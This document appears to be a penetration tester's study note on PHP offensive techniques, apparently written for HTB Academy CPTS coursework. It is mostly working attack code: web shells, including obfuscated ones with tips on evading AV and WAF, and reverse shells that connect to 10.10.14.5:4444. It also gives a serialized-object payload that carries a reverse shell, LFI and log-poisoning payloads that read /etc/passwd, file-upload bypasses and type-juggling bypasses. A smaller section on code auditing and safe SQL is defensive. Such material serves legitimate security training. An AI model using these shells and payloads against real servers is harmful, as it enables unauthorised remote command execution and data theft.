# PHP

**Tags:** `#php` `#webshell` `#scripting` `#webappsec` `#lfi` `#rce`

PHP is the most prevalent server-side web language. As a tester, PHP knowledge covers three distinct areas: writing web shells and reverse shell payloads, understanding vulnerable PHP code patterns (LFI, SQLi, type juggling, deserialization), and auditing PHP applications for logic flaws.

> [!note]
> Most PHP web shells get flagged by AV/WAF. Obfuscate function names, use variable functions, or encode payloads. For interactive access, always upgrade a web shell to a reverse shell as soon as possible.

---

## Web Shells

```php
<?php system($_GET['cmd']); ?>

<?php echo shell_exec($_GET['cmd']); ?>

<?php passthru($_GET['cmd']); ?>

<?php echo `$_GET[cmd]`; ?>

# With output buffering (cleaner output)
<?php
ob_start();
system($_GET['cmd']);
$output = ob_get_clean();
echo "<pre>" . htmlspecialchars($output) . "</pre>";
?>

# POST-based (less visible in logs)
<?php system($_POST['cmd']); ?>

# Obfuscated — variable function
<?php $f = $_GET['f']; $c = $_GET['c']; $f($c); ?>
# Usage: ?f=system&c=id

# Char-based obfuscation
<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_GET['c']); ?>
```

**Interactive browser form** — a small step up from a one-liner: gives you an input box + rendered output in the browser, so you don't hand-URL-encode every command. Drop it as `shell.php` after an upload/LFI-to-write:

```php
<html><body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
  <input type="text" name="cmd" autofocus id="cmd" size="80">
  <input type="submit" value="Run">
</form>
<pre><?php if (isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?></pre>
</body></html>
```

> [!tip] `2>&1` folds stderr into the page so failed commands aren't silently blank. Prefer this form as a quick manual foothold, then pivot to a real shell (`bash -c 'bash -i >& /dev/tcp/…'`) — see [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]].

---

## Reverse Shell (PHP)

```php
<?php
$sock = fsockopen("10.10.14.5", 4444);
$proc = proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock), $pipes);
?>

# One-liner
<?php $s=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>

# exec variant
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>

# Python fallback (if php functions disabled)
<?php system("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"); ?>
```

---

## Dangerous Functions (Code Audit)

```php
# Code execution
system()          # executes command, prints output
exec()            # executes command, returns last line
shell_exec()      # executes command, returns full output
passthru()        # executes command, sends raw output to browser
popen()           # opens process file pointer
proc_open()       # open process with I/O control
`backtick`        # shell_exec alias

# Code evaluation
eval()            # execute string as PHP
assert()          # can evaluate strings in older PHP
preg_replace()    # with /e modifier (PHP <7) → executes replacement as code
create_function() # deprecated eval wrapper
call_user_func()  # call arbitrary functions
call_user_func_array()

# File operations
include()         # execute PHP in included file → LFI→RCE
require()
include_once()
file_get_contents()
file_put_contents()  # write arbitrary files
readfile()
fopen(), fread(), fwrite()

# Deserialization
unserialize()     # deserialize user input → object injection
```

---

## Type Juggling / Loose Comparison

```php
# PHP uses loose comparison (==) by default — causes unexpected behavior
# strcmp() returns 0 (falsy) on success — but also returns NULL on non-string input (also falsy)
# md5() of array returns NULL — bypasses hash comparisons

# Type juggling bypass examples
"0e12345" == "0e98765"   # TRUE — both treated as 0^n = 0 (scientific notation)
"0" == false             # TRUE
"" == false              # TRUE
"1" == true              # TRUE
null == false            # TRUE
0 == "a"                 # TRUE (PHP7: FALSE — changed behavior)

# Magic hash bypass (== comparison)
# Find MD5 hashes starting with 0e (treated as 0 in loose comparison)
# QNKCDZO → md5 = 0e830400451993494058024219903391
# 240610708 → md5 = 0e462097431906509019562988736854

# strcmp() array bypass
# strcmp([], "password") → NULL == 0 → true in loose comparison
# POST: password[]=anything

# JSON type confusion
# {"auth": true}  vs  {"auth": "secret"}
# If server checks: if ($input['auth'] == true) — any truthy value passes
```

---

## LFI Payloads

```php
# Basic LFI
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd     # filter bypass
?page=..%2f..%2f..%2fetc%2fpasswd     # URL encoded
?page=php://filter/read=convert.base64-encode/resource=/etc/passwd

# Null byte (PHP <5.3.4)
?page=../../../../etc/passwd%00

# PHP wrappers
php://filter/read=convert.base64-encode/resource=index.php    # read PHP source
php://input     # with POST data containing PHP code
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=  # data URI RCE
expect://id     # requires expect extension (rare)
ssh2.exec://user:pass@127.0.0.1:22/id           # RCE over SSH — needs the ssh2 extension + valid creds
ssh2.sftp://user:pass@127.0.0.1:22/etc/passwd   # file read as the SSH user (sees more than www-data)

# LFI → RCE via log poisoning
# 1. Inject PHP into User-Agent or Referer
# 2. Include the log file
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/nginx/access.log

# LFI → RCE via /proc/self/fd
?page=../../../../proc/self/fd/0    # stdin
?page=../../../../proc/self/environ # environment variables
```

> [!note] **`ssh2.exec://` / `ssh2.sftp://` — LFI → RCE over SSH when you have creds.** These only work if the PHP **`ssh2` extension is loaded** (rare — verify first by grepping a base64-read `php.ini` / `phpinfo` for `ssh2`), and an `include()` sink also needs `allow_url_include=On`. The typical chain: reused creds + SSH firewalled externally → the web server hits `localhost:22` for you. Full preconditions, procedure, and gotchas: [[Class notes/HTB Academy/CPTS v2 (claude)/File Inclusion|File Inclusion]] → *ssh2.exec:// & ssh2.sftp://*.

---

## PHP Deserialization

```php
# PHP serialize format
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
# O = object, 4 = class name length, "User" = class name
# 2 = property count
# s = string, i = int, b = bool, N = null, a = array

# Magic methods called during unserialize (gadget chain entry points)
__unserialize(array $data)  # PHP 7.4+ — TAKES PRECEDENCE over __wakeup()
__wakeup()                  # only runs if __unserialize() is NOT defined
__destruct()                # on garbage collection — most reliable entry point

# Propagation gadgets — fire when the object is subsequently USED
__toString()  # object used as a string (echo, concat, strlen)
__invoke()    # object called as a function: $obj()
__call($n,$a) # inaccessible instance method invoked
__get($n)     # inaccessible property read
__set($n,$v)  # inaccessible property written

# NOTE: __construct() is NOT called by unserialize() — constructor validation
# is skipped entirely. That is the whole basis of PHP object injection.

# Basic payload craft (when you have source)
<?php
class Exploit {
    public $cmd = "id";
    public function __destruct() {
        system($this->cmd);
    }
}
$obj = new Exploit();
$obj->cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'";
echo serialize($obj);
?>

# Tools
# phpggc — PHP gadget chain generator
phpggc Laravel/RCE1 system "id"
phpggc -b Symfony/RCE4 exec "id"     # base64 encoded
```

---

## File Upload Bypass

```php
# Extensions to try when .php is blocked
.php3, .php4, .php5, .php7, .phtml, .phar, .phps
.PHP (case variation)
.php.jpg  (double extension — if server splits on first dot)
file.php%00.jpg  (null byte — PHP <5.3.4)

# Content-Type bypass (change in Burp)
Content-Type: image/jpeg   # instead of application/x-php

# Magic bytes bypass (prepend to PHP file)
GIF89a<?php system($_GET['cmd']); ?>
# Or: add real image header bytes, then PHP code

# .htaccess upload (if Apache, writable dir)
AddType application/x-httpd-php .jpg
# Then upload shell.jpg

# Check execution via
curl http://target/uploads/shell.php?cmd=id
```

---

## SQL Injection in PHP Source

```php
# Vulnerable patterns to look for during code audit
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$query = "SELECT * FROM users WHERE name = '" . $_POST['user'] . "'";

# Vulnerable with sprintf
$query = sprintf("SELECT * FROM users WHERE id=%d", $_GET['id']); // safe only if %d
$query = sprintf("SELECT * FROM users WHERE name='%s'", $_GET['name']); // VULNERABLE

# Safe (parameterized)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

# Grep for vulnerable patterns
grep -rn "SELECT.*\$_GET\|SELECT.*\$_POST\|SELECT.*\$_REQUEST" . --include="*.php"
grep -rn "mysql_query\|mysqli_query" . --include="*.php"
```

---

## Useful PHP CLI

```bash
# Run PHP file
php script.php

# Run inline
php -r "system('id');"
php -r "echo base64_decode('dGVzdA==');"
php -r "echo md5('password');"

# PHP info (check disabled functions, open_basedir, etc.)
php -i | grep -E "disable_functions|open_basedir|safe_mode"

# Syntax check
php -l script.php

# Interactive shell
php -a

# Serve current directory
php -S 0.0.0.0:8000

# Run with specific php.ini
php -c custom.ini script.php
```

---

## Disabled Functions Check

```php
# Check what's disabled (web)
<?php echo ini_get('disable_functions'); ?>

# Common bypass when system/exec are disabled
# 1. Use proc_open if not blocked
# 2. Use LD_PRELOAD via mail() if sendmail available
# 3. PHP 7.4+ FFI (Foreign Function Interface)
# 4. Apache mod_cgi + .htaccess
# 5. imap_open() with IMAP server string

# Check what's available
<?php
$funcs = ['system','exec','shell_exec','passthru','popen','proc_open'];
foreach($funcs as $f) {
    echo "$f: " . (function_exists($f) ? "YES" : "NO") . "\n";
}
?>
```


> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Deserialization|Deserialization]] (CPTS v2) for the full magic-method gadget reference and the `__unserialize()` / `__wakeup()` precedence rule. Chain generation: [[Tools/Payloads & Shells/phpggc|phpggc]].
---

*Created: 2026-03-13*
*Updated: 2026-08-21*
*Model: claude-opus-5*
